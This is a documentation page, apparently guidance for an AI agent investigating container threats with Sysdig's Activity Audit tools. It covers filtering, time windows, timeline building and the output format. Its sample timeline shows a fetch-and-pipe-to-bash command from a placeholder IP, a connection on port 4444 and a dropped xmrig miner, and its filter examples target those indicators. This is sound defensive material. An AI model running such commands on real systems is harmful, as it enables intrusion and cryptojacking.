# Activity Audit trail

The Activity Audit trail is the agent-captured record of what a workload
*did* — command executions, network connections, file accesses, and
Kubernetes audit events — independent of whether any of it tripped a Falco
rule. The Threats Engine tells you *a* detection fired; the audit trail tells
you everything the affected container/pod/workload did around that moment, so
you can confirm scope, dwell time, and lateral-movement signals the detection
alone doesn't surface.

Pull it whenever you have a concrete resource (container ID, pod, workload, or
host) and a trigger timestamp — which is almost always, once Phase 1 has
resolved the threat.

## Tools

Exposed by the Sysdig MCP server. The table below uses the **bare** tool names; match
them by suffix against whatever prefix your agent gives the Sysdig server (see
[How Sysdig tools are named](auth-preflight.md#how-sysdig-tools-are-named)):

| Tool | Use |
|------|-----|
| `list_activity_audit_events` | The main one. List entries in a time window or by cursor, scoped by type / zone / filter. |
| `trace_activity_audit_command` | Given a **command-type** entry id, reconstruct the child processes, connections, and files spawned in the same session. The audit-trail equivalent of a process tree, but it follows the data flow (C2 connections, dropped files) — not just lineage. |
| `get_activity_audit_event` | Fetch a single entry by id for full detail. Use sparingly — `list` already returns full records. |

### Entry types

`list_activity_audit_events` `types` accepts one or more of:

- `command` — a process execution (`cmdline`, `comm`, `pcomm`, `pid`, `ppid`, `uid`, `username`, `cwd`, `procExepath`, `userLoginName`).
- `connection` — a network connection (`clientIpv4`/`clientPort`, `serverIpv4`/`serverPort`, `direction`, `l4protocol`, `processName`, `dnsDomains`).
- `fileaccess` — a file operation (`directory`, `filename`, `permissions`, `comm`).
- `kubernetes` — a K8s audit record (`resource`, `subResource`, `namespace`, `name`, `user`, `userAgent`, `sourceAddresses`, `args`).

Omit `types` to get everything. For the investigation timeline you usually want
`["command", "connection", "fileaccess"]` — the K8s audit stream is already
covered by the `k8s_audit` runtime-event source in the cluster sweep.

## Time scoping — the exception to the `scope_hours` rule

Unlike `list_runtime_events` (which only takes `scope_hours` counted back from
now and forces client-side post-filtering — see the Phase 2 "Time scoping"
note), the activity audit tools take a **real absolute window**:

- `from` / `to` accept a Unix epoch (ns/µs/ms/s, auto-detected), an ISO-8601
  timestamp, or a relative offset from now (`30m`, `6h`, `7d`).
- The window between `from` and `to` cannot exceed **2 weeks**.
- Defaults to the **last hour** if neither `from`/`to` nor `cursor` is given.

**Pass nanosecond epochs as a string, never a bare number.** A ns epoch
(~1.78e18) exceeds JavaScript's safe-integer range (2^53 ≈ 9e15), and the tool
rejects a numeric value with `Numeric timestamp exceeds safe integer
precision; pass large epoch values (e.g. nanoseconds) as a string`. Runtime
event timestamps come back in **ns**, so the trigger time you carry into this
call is already over the limit. Two safe options: convert to **ISO-8601**
(cleanest — e.g. `"2026-05-04T18:30:00Z"`), or pass the ns epoch **quoted as a
string** (`"1782466806976374000"`). Seconds/ms epochs are under the limit and
fine as numbers, but when in doubt use ISO-8601.

So a "±2h around the trigger" band is a direct parameter here: pass
`from = <trigger_ts − 2h>` and `to = <trigger_ts + 2h>` as ISO-8601 (or a
quoted ns string). Do **not** apply the runtime-events post-filter workaround
to these calls.

Paginate with the `page.next` / `page.prev` cursor from the response (mutually
exclusive with `from`/`to`).

## Scope to the affected resource — not the whole host

The trail is high-volume. Always narrow it to the container / pod / workload
under investigation, never the bare host, or you'll drown the timeline in
unrelated activity from co-tenant pods on the same node.

Build the `filter` from the identifiers already on the case object (the event
payload, process tree, and threat detail carry these). Confirmed filterable
attributes:

- `container.id = "<id>"` — tightest scope; prefer it when the trigger event or
  process tree gives you a container ID.
- `kubernetes.pod.name = "<pod>"`, `kubernetes.namespace.name = "<ns>"`,
  `kubernetes.workload.name = "<workload>"` — for K8s workloads when you don't
  have a single container ID, or want the whole workload.
- `host.hostName = "<host>"` — **only** as a last resort for non-K8s hosts, or
  to deliberately widen to host scope when chasing an escape. Note this is the
  whole host; say so in the report.
- Process / connection predicates compose with `and`/`or`/`not`:
  `comm = "xmrig"`, `pid in (1, 2) and not ppid = 0`, `serverPort = 4444`.
- `freeText = "<term>"` — pseudo-attribute for free-text search across the
  record (e.g. `freeText = "/tmp/"`).

**Filter attribute names ≠ response field names.** You *filter* on the dotted
label form (`container.id`, `host.hostName`) but the records come back with a
flattened top-level field (`containerId`, `hostname`) plus the dotted form
under `labels` (`labels["container.id"]`). Don't expect a `container.id` key at
the top level of a returned entry.

**Container scope can return empty even when the resource is busy — verify, don't
assume "quiet".** If `container.id = "<id>"` comes back empty, the agent may be
emitting **host-level capture only** for that container: the same window scoped
by `host.hostName` returns plenty of records, but every one has
`containerId: ""` (no per-container attribution). That's a capture-granularity
gap, not a quiet workload, and the two must be reported differently. So when a
container-scoped list is empty: re-run once scoped by `host.hostName`; if those
host records have blank `containerId`, record the limitation as *"host-level
capture only — per-container attribution unavailable for this resource"* rather
than *"no activity"*. (See the Output shape `limitations` note.)

**Confirm a resource actually populates container-attributed records before
committing to it as the timeline subject.** The top-by-`lastSignal` threat is
not always the one with the richest audit trail. A cheap unscoped
`types:["command"]` probe over the window (then eyeball which containers have
non-empty `containerId`) tells you which resource will actually yield a
timeline.

Example — command + connection + file activity for one container in a ±2h band:

```
list_activity_audit_events(
  from   = "<trigger_ts − 2h, ISO-8601>",
  to     = "<trigger_ts + 2h, ISO-8601>",
  types  = ["command", "connection", "fileaccess"],
  filter = 'container.id = "<container-id>"',
  limit  = 50
)
```

**Keep `limit` modest (≈50).** Records are label-heavy — each carries 30+
`labels` keys — so even ~25–50 entries can overflow the tool-result size cap and
spill to a file. Prefer a tighter window + a lower limit and paginate with the
cursor over asking for `limit = 200` in one shot.

## Building the timeline

1. **Scope + window.** Resolve the container/pod/workload from the case object;
   set the window to ±2h around the trigger (widen to the dwell window if the
   threat's `startTime`→`lastSignal` span is larger, capped at 2 weeks).
2. **List** the `command` / `connection` / `fileaccess` entries for that scope.
   Every entry's `timestamp` is in **nanoseconds** — divide by 1e9 for epoch
   seconds when rendering `HH:MM:SS` UTC. For `connection` entries, render the
   `dnsDomains` value (when present) rather than the raw `serverIpv4` — it
   resolves the IP to the destination an analyst recognises (e.g.
   `donate.v2.xmrig.com` instead of `178.128.242.134`). Keep the IP for the IOC
   cross-check.
3. **Correlate to the detection.** Mark the entry (or entries) whose timestamp
   and process match the trigger event — that's the anchor row. Everything
   before it is pre-detection setup; everything after is post-detection
   activity (dwell, lateral movement, exfil).
4. **Trace suspicious commands.** For any command that looks like the pivot
   (dropper, reverse shell, miner, recon sweep), call
   `trace_activity_audit_command` with its entry id to pull the connections and
   files it spawned in the same session. Only command entries flagged
   `traceable: true` can be traced — these are the session-leader `sh -c …`
   wrappers, not the leaf `curl`/`tar` children; pick the traceable parent and
   the trace returns the whole session (child commands, their connections, and
   file writes). Fold those into the timeline and the attack-flow diagram.
5. **Cross-reference IOCs.** Connection `serverIpv4` / `dnsDomains` values feed
   the GeoIP + Sysdig TI cross-check (see `enrichment-network.md`); file paths
   and command lines feed the binary / VT lookup (`enrichment-binary.md`).

## Output shape

Attach to the case object as `case.activity_audit`:

```json
{
  "status": "done",
  "scope": "container.id = \"<id>\"",
  "window": { "from": "2026-05-04T16:30:00Z", "to": "2026-05-04T20:30:00Z" },
  "counts": { "command": 14, "connection": 6, "fileaccess": 9 },
  "anchor_entry_id": "18bc945a0e6828f657290783ff04f9bc",
  "timeline": [
    { "ts": "2026-05-04T18:30:11Z", "type": "command", "detail": "curl -sL http://1.2.3.4/x.sh | bash", "entry_id": "..." },
    { "ts": "2026-05-04T18:30:14Z", "type": "connection", "detail": "out tcp 1.2.3.4:4444 (xmrig)", "entry_id": "..." },
    { "ts": "2026-05-04T18:30:15Z", "type": "fileaccess", "detail": "write /tmp/.x/xmrig", "entry_id": "..." }
  ],
  "truncated": false,
  "limitations": []
}
```

If the trail is empty or the feature isn't enabled in the tenant, record
`{ "status": "skipped", "reason": "no activity audit data for this scope" }`
and push a note into `limitations`. Activity Audit depends on the agent's
`commands`/`connections`/`fileaccesses`/`kubernetes` capture being enabled — an
empty result is not a failure, but flag it in the summary so the analyst knows
the audit context was unavailable rather than clean.

**Distinguish "no per-container capture" from "quiet workload".** Before
recording the skip, apply the host-scope check above: if `host.hostName`
returns records but they all carry `containerId: ""`, the right reason is
`"host-level capture only — per-container attribution unavailable"` (and you
may still render a host-scoped timeline, clearly labelled as host-wide). Only
record `"no activity"` when neither container nor host scope returns anything.

When `list` returns more than `limit` entries (`page.total` > returned), set
`truncated: true` and record `shown` / `total` — never silently drop rows.
Prefer tightening the window or the filter over blind cursor pagination.
